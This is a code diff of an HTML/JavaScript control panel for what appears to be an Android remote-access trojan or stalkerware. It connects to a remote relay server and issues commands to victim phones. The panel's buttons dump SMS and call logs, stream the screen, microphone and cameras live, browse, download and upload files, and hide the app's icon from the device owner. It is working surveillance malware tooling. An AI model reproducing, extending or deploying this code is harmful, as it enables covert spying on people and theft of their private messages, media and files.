@@ -2,118 +2,76 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Console</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Console</title>
 <style>
   :root { --bg:#121212; --panel:#1E1E1E; --fg:#e0e0e0; --acc:#00E676; --warn:#FF5252; --dim:#888; --line:#333; }
   * { box-sizing: border-box; }
-  body { margin:0; background:var(--bg); color:var(--fg); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; font-size:14px; padding-bottom:20px; }
-  
-  header { background:var(--panel); padding:12px; position:sticky; top:0; z-index:10; display:flex; flex-direction:column; gap:8px; border-bottom-left-radius: 16px; border-bottom-right-radius: 16px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+  body { margin:0; background:var(--bg); color:var(--fg); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; font-size:14px; }
+  header { background:var(--panel); padding:12px; position:sticky; top:0; z-index:10; display:flex; flex-direction:column; gap:8px; border-radius: 0 0 16px 16px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
   .row { display:flex; align-items:center; gap:8px; }
-  .input-group { flex:1; display:flex; gap:8px; min-width:0; }
-  .input-group input { flex:1; min-width:0; background:#121212; border:1px solid var(--line); color:var(--fg); padding:10px; border-radius:8px; font-size:13px; outline:none; }
-  #connectBtn { background:var(--acc); color:#000; border:none; padding:10px 16px; border-radius:8px; font-weight:bold; font-size:13px; cursor:pointer; white-space:nowrap; }
+  .input-group { flex:1; display:flex; gap:8px; }
+  .input-group input { flex:1; background:#121212; border:1px solid var(--line); color:var(--fg); padding:10px; border-radius:8px; }
+  #connectBtn { background:var(--acc); color:#000; border:none; padding:10px 16px; border-radius:8px; font-weight:bold; cursor:pointer; }
   .status-bar { display:flex; align-items:center; gap:6px; font-size:12px; font-weight:bold; color:var(--dim); }
   .dot { width:10px; height:10px; border-radius:50%; background:var(--warn); }
   .dot.on { background:var(--acc); box-shadow:0 0 8px var(--acc); }
-  select { background:#121212; color:var(--acc); border:1px solid var(--line); padding:8px; border-radius:8px; outline:none; font-size:12px; max-width:200px; font-weight:bold; }
-
-  #msg-box { display:none; background:var(--warn); color:#fff; padding:10px; text-align:center; font-weight:bold; font-size:12px; position:fixed; top:10px; left:10px; right:10px; z-index:99; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.5); }
-
-  nav { display:flex; background:var(--bg); padding: 12px 12px 0 12px; gap: 8px; overflow-x:auto; scrollbar-width:none; }
-  nav::-webkit-scrollbar { display:none; }
-  nav button { flex:0 0 auto; background:var(--panel); border:none; color:var(--dim); padding:10px 16px; font-size:12px; font-weight:bold; text-transform:uppercase; border-radius:10px; white-space:nowrap; cursor:pointer; transition:0.2s; }
+  select { background:#121212; color:var(--acc); border:1px solid var(--line); padding:8px; border-radius:8px; max-width:200px; }
+  nav { display:flex; padding: 12px 12px 0 12px; gap: 8px; overflow-x:auto; }
+  nav button { background:var(--panel); border:none; color:var(--dim); padding:10px 16px; border-radius:10px; font-weight:bold; cursor:pointer; }
   nav button.active { color:#000; background:var(--acc); }
-
   main { padding:12px; }
-  .tab { display:none; }
-  .tab.active { display:block; animation: fadeIn 0.2s; }
-  @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
-
+  .tab { display:none; } .tab.active { display:block; }
   .card { background:var(--panel); border-radius:16px; padding:16px; margin-bottom:12px; }
-  .card h2 { margin:0 0 12px 0; font-size:13px; color:var(--acc); font-weight:bold; letter-spacing:0.5px; }
+  .card h2 { margin:0 0 12px 0; font-size:13px; color:var(--acc); }
   .grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
-  button.act { background:#2C2C2C; color:var(--fg); border:none; padding:14px; border-radius:12px; font-size:13px; font-weight:bold; text-align:center; cursor:pointer; transition:0.1s; }
-  button.act:active { background:#444; transform:scale(0.96); }
-  button.act.danger { color:#fff; background:var(--warn); }
-  button.act.success { color:#000; background:var(--acc); }
-
-  .screen-container { position:relative; width:100%; background:#000; border-radius:12px; margin-top:12px; overflow:hidden; touch-action:none; }
+  button.act { background:#2C2C2C; color:var(--fg); border:none; padding:14px; border-radius:12px; font-weight:bold; cursor:pointer; }
+  button.act.danger { background:var(--warn); color:#fff; }
+  button.act.success { background:var(--acc); color:#000; }
+  .screen-container { position:relative; background:#000; border-radius:12px; margin-top:12px; touch-action:none; }
   canvas { width:100%; display:block; }
-  .touch-ripple { position:absolute; width:30px; height:30px; border:2px solid var(--acc); border-radius:50%; transform:translate(-50%, -50%); pointer-events:none; animation:ripple 0.4s ease-out; }
-  @keyframes ripple { from { opacity:1; transform:translate(-50%,-50%) scale(1); } to { opacity:0; transform:translate(-50%,-50%) scale(2); } }
-
-  .kv { display:flex; justify-content:space-between; padding:10px 0; border-bottom:1px solid var(--line); font-size:13px; }
-  .kv span { color:var(--dim); }
-  pre { background:#121212; padding:12px; border-radius:12px; overflow:auto; font-size:12px; color:#aaa; max-height:250px; margin-top:12px; }
-
+  pre { background:#121212; padding:12px; border-radius:12px; font-size:12px; color:#aaa; max-height:250px; overflow:auto; }
   .file-list { display:flex; flex-direction:column; gap:8px; margin-top:12px; }
-  .file-item { display:flex; justify-content:space-between; padding:14px; background:#2C2C2C; border-radius:12px; font-size:13px; cursor:pointer; }
-  .file-item.folder { color:#64B5F6; font-weight:bold; }
-  .file-item:active { background:#444; transform:scale(0.98); }
-  .path-bar { display:flex; gap:8px; }
-  .path-bar input { flex:1; background:#121212; border:1px solid var(--line); color:var(--fg); padding:12px; border-radius:8px; outline:none; min-width:0; }
-  
-  #notif-log { display:flex; flex-direction:column; gap:8px; }
-  .notif { background:#2C2C2C; padding:14px; border-radius:12px; font-size:13px; border-left:4px solid var(--acc); }
-  .notif b { color:var(--acc); font-size:11px; display:block; margin-bottom:4px; text-transform:uppercase; }
+  .file-item { display:flex; justify-content:space-between; padding:14px; background:#2C2C2C; border-radius:12px; cursor:pointer; }
   img#cam-img { width:100%; border-radius:12px; margin-top:12px; display:none; }
 </style>
 </head>
 <body>
-
-<div id="msg-box"></div>
-
 <header>
   <div class="row">
     <div class="input-group">
-      <input id="server" placeholder="Server URL" value="https://dmanager.onrender.com">
+      <input id="server" placeholder="Server URL" value="https://dmanager.fly.dev">
       <input id="psk" type="password" placeholder="PSK">
     </div>
     <button id="connectBtn" onclick="connect()">Connect</button>
   </div>
-  
   <div class="row" style="justify-content:space-between;">
-    <div class="status-bar">
-      <div id="led" class="dot"></div>
-      <span id="status">Disconnected</span>
-    </div>
+    <div class="status-bar"><div id="led" class="dot"></div><span id="status">Disconnected</span></div>
     <select id="device-select" onchange="onDeviceChange()"><option value="">No Device</option></select>
   </div>
 </header>
-
 <nav>
   <button class="active" onclick="switchTab('live', this)">Live</button>
   <button onclick="switchTab('device', this)">Device</button>
   <button onclick="switchTab('camera', this)">Camera</button>
   <button onclick="switchTab('files', this)">Files</button>
-  <button onclick="switchTab('notifs', this)">Notifs</button>
 </nav>
-
 <main>
   <div id="tab-live" class="tab active">
-    <div class="card">
-      <h2>Live Screen</h2>
+    <div class="card"><h2>Live Screen</h2>
       <div class="grid" style="margin-bottom:10px;">
         <button class="act success" id="btn-screen" onclick="toggleScreen()">Start Screen</button>
         <button class="act" id="btn-audio" onclick="toggleAudio()">Start Audio</button>
       </div>
-      <div class="screen-container" id="screen-container">
-        <canvas id="screen" width="480" height="800"></canvas>
-      </div>
-      <div style="font-size:11px;color:var(--dim);margin-top:8px; text-align:center;" id="frameCount">0 frames</div>
+      <div class="screen-container" id="screen-container"><canvas id="screen" width="480" height="800"></canvas></div>
     </div>
   </div>
-
   <div id="tab-device" class="tab">
-    <div class="card">
-      <h2>Device Info</h2>
-      <div id="telemetry-data"><div class="kv"><span>Status</span><b>Select a device</b></div></div>
-      <button class="act success" id="btn-refresh-telemetry" style="width:100%; margin-top:16px;" onclick="refreshTelemetry()">Refresh Info</button>
+    <div class="card"><h2>Device Info</h2>
+      <div id="telemetry-data"></div>
+      <button class="act success" style="width:100%; margin-top:10px;" onclick="refreshTelemetry()">Refresh Info</button>
     </div>
-    <div class="card">
-      <h2>Data Extraction</h2>
+    <div class="card"><h2>Data Extraction</h2>
       <div class="grid">
         <button class="act" onclick="runCmd('get_sms', {limit: 50})">Dump SMS</button>
         <button class="act" onclick="runCmd('get_calllogs', {limit: 50})">Dump Calls</button>
@@ -123,10 +81,8 @@
       <pre id="extract-out">Awaiting command...</pre>
     </div>
   </div>
-
   <div id="tab-camera" class="tab">
-    <div class="card">
-      <h2>Camera Control</h2>
+    <div class="card"><h2>Camera Control</h2>
       <div class="grid" style="margin-bottom:10px;">
         <button class="act success" onclick="runCmd('start_camera', {facing: 'front'})">Front Cam</button>
         <button class="act success" onclick="runCmd('start_camera', {facing: 'back'})">Back Cam</button>
@@ -135,352 +91,138 @@
       <img id="cam-img">
     </div>
   </div>
-
   <div id="tab-files" class="tab">
-    <div class="card">
-      <h2>File Manager</h2>
-      <div class="path-bar">
-        <input id="file-path" value="/sdcard" placeholder="/sdcard">
-        <button class="act" id="btn-ls" style="padding:12px;" onclick="listDir()">Go</button>
+    <div class="card"><h2>File Manager</h2>
+      <div class="row">
+        <input id="file-path" value="/sdcard" style="flex:1; padding:10px; border-radius:8px; border:1px solid #333; background:#121212; color:white;">
+        <button class="act" onclick="listDir()">Go</button>
       </div>
       <div class="file-list" id="file-list"></div>
-      <pre id="files-out" style="margin-top:16px;">Awaiting command...</pre>
+      <pre id="files-out" style="margin-top:12px;">Awaiting command...</pre>
     </div>
-    <div class="card">
-      <h2>Transfer</h2>
-      <input id="upload" type="file" style="color:var(--fg); margin-bottom:16px; display:block; width:100%;">
+    <div class="card"><h2>Transfer</h2>
+      <input id="upload" type="file" style="margin-bottom:10px; width:100%;">
       <div class="grid">
-        <button class="act success" id="btn-ul" onclick="uploadFile()">Upload File</button>
-        <button class="act" id="btn-dl" onclick="downloadFile()">Download File</button>
+        <button class="act success" onclick="uploadFile()">Upload</button>
+        <button class="act" onclick="downloadFile()">Download</button>
       </div>
-    </div>
-  </div>
-
-  <div id="tab-notifs" class="tab">
-    <div class="card">
-      <h2>Live Notifications</h2>
-      <div id="notif-log"></div>
     </div>
   </div>
 </main>
-
 <script>
-window.onerror = function(msg) {
-  const box = document.getElementById('msg-box');
-  box.textContent = "Error: " + msg;
-  box.style.display = 'block';
-  setTimeout(() => { box.style.display = 'none'; }, 5000);
-};
-
 const $ = id => document.getElementById(id);
-let ws = null;
-let currentDevice = "";
-let realScreenW = 1080, realScreenH = 1920;
-let isHidden = false;
-let pingInterval = null;
+let ws = null, currentDevice = "", realW = 1080, realH = 1920, isHidden = false, pingInt = null;
 
-function switchTab(tabId, btn) {
+function switchTab(id, btn) {
   document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
   document.querySelectorAll('nav button').forEach(el => el.classList.remove('active'));
-  $(`tab-${tabId}`).classList.add('active');
-  if(btn) btn.classList.add('active');
+  $(`tab-${id}`).classList.add('active'); btn.classList.add('active');
 }
-
-function formatUrl(url) {
-  if (!url) return "";
-  url = url.trim().replace(/\/+$/, '');
-  if (!url.startsWith('http://') && !url.startsWith('https://')) { url = 'https://' + url; }
-  return url;
-}
-
-function onDeviceChange() {
-  currentDevice = $('device-select').value;
-  if (currentDevice) refreshTelemetry();
-}
+function formatUrl(url) { return url.startsWith('http') ? url.replace(/\/+$/, '') : 'https://' + url.replace(/\/+$/, ''); }
+function onDeviceChange() { currentDevice = $('device-select').value; if (currentDevice) refreshTelemetry(); }
 
 async function connect() {
-  const psk = $('psk').value.trim();
-  const server = formatUrl($('server').value);
-  if (!psk || !server) { alert('Enter server + PSK'); return; }
-  
-  sessionStorage.setItem('psk', psk);
-  sessionStorage.setItem('server', server);
-  
-  $('connectBtn').textContent = 'Waking...';
-  $('status').textContent = 'Waking...';
-  
-  try { await fetch(server + '/api/wake', { mode: 'no-cors' }); } catch (e) {}
-  
+  const psk = $('psk').value.trim(), server = formatUrl($('server').value);
+  if (!psk || !server) return alert('Enter server + PSK');
+  sessionStorage.setItem('psk', psk); sessionStorage.setItem('server', server);
+  $('status').textContent = 'Connecting...';
   openWs(server, psk);
 }
 
 function openWs(server, psk) {
-  if (ws) try { ws.close(); } catch (_) {}
-  try {
-    const u = new URL(server);
-    u.protocol = u.protocol === 'https:' ? 'wss:' : 'ws:';
-    u.pathname = '/ws'; u.search = '';
-    
-    ws = new WebSocket(u.toString());
-    ws.onopen = () => { 
-      $('led').className = 'dot on'; 
-      $('status').textContent = 'Connected'; 
-      $('connectBtn').textContent = 'Connected';
-      ws.send(JSON.stringify({ role: 'dashboard', psk })); 
-      
-      // HEARTBEAT: Ping every 10s to prevent Render timeout
-      if (pingInterval) clearInterval(pingInterval);
-      pingInterval = setInterval(() => {
-          if (ws && ws.readyState === WebSocket.OPEN) {
-              ws.send(JSON.stringify({ type: 'ping' }));
-          }
-      }, 10000);
-    };
-    ws.onmessage = ev => { try { handlePush(JSON.parse(ev.data)); } catch (_) {} };
-    ws.onclose = () => {
-      $('led').className = 'dot'; 
-      $('status').textContent = 'Reconnecting...';
-      $('connectBtn').textContent = 'Reconnect';
-      if (pingInterval) clearInterval(pingInterval);
-      const p = sessionStorage.getItem('psk'), s = sessionStorage.getItem('server');
-      if (p && s) setTimeout(() => openWs(s, p), 3000);
-    };
-    ws.onerror = () => { 
-      $('status').textContent = 'WS Error'; 
-      $('connectBtn').textContent = 'Connect';
-    };
-  } catch(e) { $('status').textContent = 'Invalid URL'; }
+  if (ws) ws.close();
+  const u = new URL(server); u.protocol = u.protocol === 'https:' ? 'wss:' : 'ws:'; u.pathname = '/ws';
+  ws = new WebSocket(u.toString());
+  ws.onopen = () => {
+    $('led').className = 'dot on'; $('status').textContent = 'Connected'; $('connectBtn').textContent = 'Connected';
+    ws.send(JSON.stringify({ role: 'dashboard', psk }));
+    pingInt = setInterval(() => { if (ws.readyState === 1) ws.send(JSON.stringify({ type: 'ping' })); }, 10000);
+  };
+  ws.onmessage = ev => handlePush(JSON.parse(ev.data));
+  ws.onclose = () => {
+    $('led').className = 'dot'; $('status').textContent = 'Reconnecting...'; $('connectBtn').textContent = 'Reconnect';
+    clearInterval(pingInt); setTimeout(() => openWs(server, psk), 3000);
+  };
 }
 
 function handlePush(msg) {
   if (msg.type === 'device_list') {
-    const sel = $('device-select');
-    sel.innerHTML = '<option value="">Select Device</option>';
-    msg.devices.forEach(d => {
-        if (typeof d === 'string') addDeviceOption(d, 'Device');
-        else addDeviceOption(d.id, d.name);
-    });
-    if (msg.devices.length > 0 && !currentDevice) {
-        let firstId = typeof msg.devices[0] === 'string' ? msg.devices[0] : msg.devices[0].id;
-        sel.value = firstId; onDeviceChange();
-    }
-  } else if (msg.type === 'device_online') {
-    addDeviceOption(msg.device_id, msg.device_name || 'Device');
-  } else if (msg.type === 'device_offline') {
-    const sel = $('device-select');
-    const opt = [...sel.options].find(o => o.value === msg.device_id);
+    $('device-select').innerHTML = '<option value="">Select Device</option>';
+    msg.devices.forEach(d => addDeviceOption(d.id, d.name));
+    if (msg.devices.length > 0 && !currentDevice) { $('device-select').value = msg.devices[0].id; onDeviceChange(); }
+  } else if (msg.type === 'device_online') addDeviceOption(msg.device_id, msg.device_name);
+  else if (msg.type === 'device_offline') {
+    const opt = [...$('device-select').options].find(o => o.value === msg.device_id);
     if (opt) opt.remove();
-    if (currentDevice === msg.device_id) { currentDevice = ""; }
+    if (currentDevice === msg.device_id) currentDevice = "";
   } else if (msg.type === 'push') {
-    if (msg.kind === 'screen_frame') drawScreenFrame(msg.data);
+    if (msg.kind === 'screen_frame') drawScreen(msg.data);
     else if (msg.kind === 'camera_frame') { $('cam-img').src = 'data:image/jpeg;base64,' + msg.data; $('cam-img').style.display = 'block'; }
     else if (msg.kind === 'audio_chunk') playAudio(msg.data);
-    else if (msg.kind === 'notification') addNotif(msg.data);
-  } else if (msg.type === 'error') {
-    $('status').textContent = msg.error;
-    alert('Server auth failed. Check PSK.');
   }
 }
-
 function addDeviceOption(id, name) {
-  if (!id) return;
-  const sel = $('device-select');
-  if ([...sel.options].some(o => o.value === id)) return;
-  const opt = document.createElement('option');
-  opt.value = id; 
-  const shortId = typeof id === 'string' ? id.substring(0, 6) : 'unknown';
-  opt.textContent = `${name} (${shortId}...)`;
-  sel.appendChild(opt);
-  if (!currentDevice) { sel.value = id; onDeviceChange(); }
+  if ([...$('device-select').options].some(o => o.value === id)) return;
+  const opt = document.createElement('option'); opt.value = id; opt.textContent = `${name} (${id.substring(0,6)}...)`;
+  $('device-select').appendChild(opt);
+  if (!currentDevice) { $('device-select').value = id; onDeviceChange(); }
 }
 
-let frameCount = 0;
-function drawScreenFrame(b64) {
-  const cv = $('screen'), ctx = cv.getContext('2d');
-  const img = new Image();
-  img.onload = () => {
-    if (cv.width !== img.width || cv.height !== img.height) { cv.width = img.width; cv.height = img.height; }
-    ctx.drawImage(img, 0, 0);
-    frameCount++; $('frameCount').textContent = frameCount + ' frames';
-  };
+function drawScreen(b64) {
+  const cv = $('screen'), ctx = cv.getContext('2d'), img = new Image();
+  img.onload = () => { if (cv.width !== img.width) { cv.width = img.width; cv.height = img.height; } ctx.drawImage(img, 0, 0); };
   img.src = 'data:image/jpeg;base64,' + b64;
 }
-
-const cv = $('screen');
-let touchStartX = 0, touchStartY = 0, touchStartTime = 0;
-function getCanvasCoords(e) {
-  const rect = cv.getBoundingClientRect();
-  const clientX = e.touches ? e.touches[0].clientX : e.clientX;
-  const clientY = e.touches ? e.touches[0].clientY : e.clientY;
-  return { x: (clientX - rect.left) * (cv.width / rect.width), y: (clientY - rect.top) * (cv.height / rect.height) };
-}
-function showRipple(clientX, clientY) {
-  const cont = $('screen-container');
-  const rect = cont.getBoundingClientRect();
-  const rip = document.createElement('div');
-  rip.className = 'touch-ripple';
-  rip.style.left = (clientX - rect.left) + 'px';
-  rip.style.top = (clientY - rect.top) + 'px';
-  cont.appendChild(rip);
-  setTimeout(() => rip.remove(), 400);
-}
-cv.addEventListener('touchstart', e => { e.preventDefault(); const c = getCanvasCoords(e); touchStartX = c.x; touchStartY = c.y; touchStartTime = Date.now(); showRipple(e.touches[0].clientX, e.touches[0].clientY); }, { passive: false });
-cv.addEventListener('touchend', async e => {
-  e.preventDefault(); const c = getCanvasCoords(e.changedTouches[0]); const dx = Math.abs(c.x - touchStartX), dy = Math.abs(c.y - touchStartY), duration = Date.now() - touchStartTime;
-  const rsX = touchStartX * (realScreenW / cv.width), rsY = touchStartY * (realScreenH / cv.height);
-  const reX = c.x * (realScreenW / cv.width), reY = c.y * (realScreenH / cv.height);
-  if (dx < 20 && dy < 20 && duration < 300) { try { await api('tap', { x: rsX, y: rsY }); } catch (_) {} }
-  else { try { await api('swipe', { x1: rsX, y1: rsY, x2: reX, y2: reY, duration: Math.max(duration, 200) }); } catch (_) {} }
-}, { passive: false });
-
-let actx = null, atime = 0;
+let actx, atime = 0;
 function playAudio(b64) {
   if (!actx) { actx = new AudioContext({ sampleRate: 16000 }); atime = actx.currentTime; }
   if (actx.state === 'suspended') actx.resume();
-  const bin = atob(b64);
-  const bytes = new Uint8Array(bin.length);
-  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
-  const pcm = new Int16Array(bytes.buffer);
-  const buf = actx.createBuffer(1, pcm.length, 16000);
-  const ch = buf.getChannelData(0);
+  const pcm = new Int16Array(Uint8Array.from(atob(b64), c => c.charCodeAt(0)).buffer);
+  const buf = actx.createBuffer(1, pcm.length, 16000); const ch = buf.getChannelData(0);
   for (let i = 0; i < pcm.length; i++) ch[i] = pcm[i] / 32768;
   const src = actx.createBufferSource(); src.buffer = buf; src.connect(actx.destination);
-  if (atime < actx.currentTime) atime = actx.currentTime;
-  src.start(atime); atime += buf.duration;
-}
-
-function addNotif(raw) {
-  const log = $('notif-log');
-  const div = document.createElement('div');
-  div.className = 'notif';
-  try { const o = JSON.parse(raw); div.innerHTML = `<b>${o.pkg}</b>${o.title ? '<strong>'+o.title+'</strong><br>' : ''}${o.text}`; }
-  catch (_) { div.textContent = raw; }
-  log.prepend(div);
-}
-
-function renderTelemetry(t) {
-  const el = $('telemetry-data'); el.innerHTML = '';
-  for (const [k, v] of Object.entries(t)) {
-    if(k === 'screen_w') realScreenW = v;
-    if(k === 'screen_h') realScreenH = v;
-    const row = document.createElement('div'); row.className = 'kv';
-    row.innerHTML = `<span>${k.replace(/_/g, ' ')}</span><b>${v}</b>`;
-    el.appendChild(row);
-  }
+  if (atime < actx.currentTime) atime = actx.currentTime; src.start(atime); atime += buf.duration;
 }
 
 async function api(cmd, args = {}) {
   if (!currentDevice) throw new Error("No device selected");
-  const psk = $('psk').value.trim();
-  const server = formatUrl($('server').value);
-  if (!psk || !server) throw new Error("No credentials");
-  
-  const r = await fetch(server + '/api/cmd', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + psk },
+  const r = await fetch(formatUrl($('server').value) + '/api/cmd', {
+    method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + $('psk').value },
     body: JSON.stringify({ device_id: currentDevice, cmd, args }),
   });
-  
-  if (!r.ok) {
-    let body = ''; try { body = (await r.json()).error || ''; } catch (_) {}
-    throw new Error(`HTTP ${r.status} — ${body}`);
-  }
+  if (!r.ok) throw new Error('Server error ' + r.status);
   return await r.json();
 }
 
-async function refreshTelemetry() {
-  try { const r = await api('get_device_info'); if (r.ok) renderTelemetry(r.data); } catch (e) { alert(e.message); }
-}
+async function refreshTelemetry() { try { const r = await api('get_device_info'); if (r.ok) { $('telemetry-data').innerHTML = Object.entries(r.data).map(([k,v]) => `<div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #333;"><span>${k}</span><b>${v}</b></div>`).join(''); if(r.data.screen_w) realW=r.data.screen_w, realH=r.data.screen_h; } } catch (e) { alert(e.message); } }
+async function runCmd(cmd, args = {}) { try { const r = await api(cmd, args); $('extract-out').textContent = JSON.stringify(r.data || r.error, null, 2); } catch (e) { alert(e.message); } }
+async function toggleHide() { try { await api(isHidden ? 'unhide_icon' : 'hide_icon'); isHidden = !isHidden; $('btn-hide').textContent = isHidden ? 'Unhide Icon' : 'Hide Icon'; } catch (e) { alert(e.message); } }
 
-async function runCmd(cmd, args = {}) {
-  try { 
-    const r = await api(cmd, args); 
-    $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('Error: ' + r.error); 
-  } catch (e) { alert(e.message); }
-}
-
-async function toggleHide() {
-    try {
-        const cmd = isHidden ? 'unhide_icon' : 'hide_icon';
-        const r = await api(cmd);
-        if (r.ok) {
-            isHidden = !isHidden;
-            const btn = $('btn-hide');
-            btn.textContent = isHidden ? 'Unhide Icon' : 'Hide Icon';
-            btn.className = isHidden ? 'act success' : 'act danger';
-        } else alert(r.error);
-    } catch (e) { alert(e.message); }
-}
-
-let screenOn = false, audioOn = false;
-async function toggleScreen() {
-  try {
-    if (!screenOn) { const r = await api('start_screen'); if (r.ok) { screenOn = true; $('btn-screen').textContent = 'Stop Screen'; $('btn-screen').classList.remove('success'); $('btn-screen').classList.add('danger'); } else alert(r.error); }
-    else { await api('stop_screen'); screenOn = false; $('btn-screen').textContent = 'Start Screen'; $('btn-screen').classList.add('success'); $('btn-screen').classList.remove('danger'); }
-  } catch (e) { alert(e.message); }
-}
-
-async function toggleAudio() {
-  try {
-    if (!audioOn) { const r = await api('start_audio'); if (r.ok) { audioOn = true; $('btn-audio').textContent = 'Stop Audio'; $('btn-audio').classList.add('danger'); } else alert(r.error); }
-    else { await api('stop_audio'); audioOn = false; $('btn-audio').textContent = 'Start Audio'; $('btn-audio').classList.remove('danger'); }
-  } catch (e) { alert(e.message); }
-}
-
-async function stopCam() {
-  try { await api('stop_camera'); $('cam-img').style.display = 'none'; } catch (e) { alert(e.message); }
-}
+let sOn = false, aOn = false;
+async function toggleScreen() { try { if (!sOn) { await api('start_screen'); sOn = true; $('btn-screen').textContent = 'Stop Screen'; $('btn-screen').classList.add('danger'); } else { await api('stop_screen'); sOn = false; $('btn-screen').textContent = 'Start Screen'; $('btn-screen').classList.remove('danger'); } } catch (e) { alert(e.message); } }
+async function toggleAudio() { try { if (!aOn) { await api('start_audio'); aOn = true; $('btn-audio').textContent = 'Stop Audio'; $('btn-audio').classList.add('danger'); } else { await api('stop_audio'); aOn = false; $('btn-audio').textContent = 'Start Audio'; $('btn-audio').classList.remove('danger'); } } catch (e) { alert(e.message); } }
+async function stopCam() { try { await api('stop_camera'); $('cam-img').style.display = 'none'; } catch (e) { alert(e.message); } }
 
 async function listDir() {
-  try { 
-    const r = await api('list_dir', { path: $('file-path').value });
-    const list = $('file-list'); list.innerHTML = '';
-    if (r.ok) {
-      r.data.entries.forEach(f => {
-        const div = document.createElement('div');
-        div.className = 'file-item ' + (f.dir ? 'folder' : '');
-        div.innerHTML = `<span>${f.dir ? '📁' : '📄'} ${f.name}</span><span>${f.dir ? '' : (f.size/1024).toFixed(1)+' KB'}</span>`;
-        div.onclick = () => { $('file-path').value = f.path; if (f.dir) { listDir(); } };
-        list.appendChild(div);
-      });
-    } else alert('Error: ' + r.error);
-  } catch (e) { alert(e.message); }
-}
-
-async function downloadFile() {
-  try { 
-    const r = await api('download_file', { path: $('file-path').value });
-    if (r.ok) {
-      const bytes = Uint8Array.from(atob(r.data.b64), c => c.charCodeAt(0));
-      const blob = new Blob([bytes], { type: 'application/octet-stream' });
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = $('file-path').value.split('/').pop() || 'file.bin';
-      a.click();
-      $('files-out').textContent = 'Downloaded.';
-    } else alert('Error: ' + r.error);
-  } catch (e) { alert(e.message); }
-}
-
-async function uploadFile() {
   try {
-    const inp = $('upload'); if (!inp.files.length) return;
-    const f = inp.files[0];
-    const reader = new FileReader();
-    reader.onload = async () => {
-      const b64 = reader.result.split(',')[1];
-      $('files-out').textContent = `Uploading ${f.name} (${(f.size/1024).toFixed(1)} KB)...`;
-      try {
-        const r = await api('upload_file', { path: $('file-path').value + "/" + f.name, data: b64 });
-        $('files-out').textContent = r.ok ? ('Uploaded successfully') : ('Error: ' + r.error);
-        listDir();
-      } catch (e) { alert('Upload failed'); }
-    };
-    reader.readAsDataURL(f);
+    const r = await api('list_dir', { path: $('file-path').value }); $('file-list').innerHTML = '';
+    if (r.ok) r.data.entries.forEach(f => {
+      const d = document.createElement('div'); d.className = 'file-item';
+      d.innerHTML = `<span>${f.dir ? '📁' : '📄'} ${f.name}</span><span>${f.dir ? '' : (f.size/1024).toFixed(1)+' KB'}</span>`;
+      d.onclick = () => { $('file-path').value = f.path; if (f.dir) listDir(); }; $('file-list').appendChild(d);
+    });
   } catch (e) { alert(e.message); }
 }
+async function downloadFile() {
+  try { const r = await api('download_file', { path: $('file-path').value }); if (r.ok) { const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([Uint8Array.from(atob(r.data.b64), c => c.charCodeAt(0))])); a.download = $('file-path').value.split('/').pop(); a.click(); } } catch (e) { alert(e.message); }
+}
+async function uploadFile() {
+  const f = $('upload').files[0]; if (!f) return; const reader = new FileReader();
+  reader.onload = async () => { try { await api('upload_file', { path: $('file-path').value + '/' + f.name, data: reader.result.split(',')[1] }); listDir(); } catch (e) { alert(e.message); } };
+  reader.readAsDataURL(f);
+}
 
-$('server').value = sessionStorage.getItem('server') || 'https://dmanager.onrender.com';
+$('server').value = sessionStorage.getItem('server') || 'https://dmanager.fly.dev';
 $('psk').value = sessionStorage.getItem('psk') || '';
 </script>
 </body>
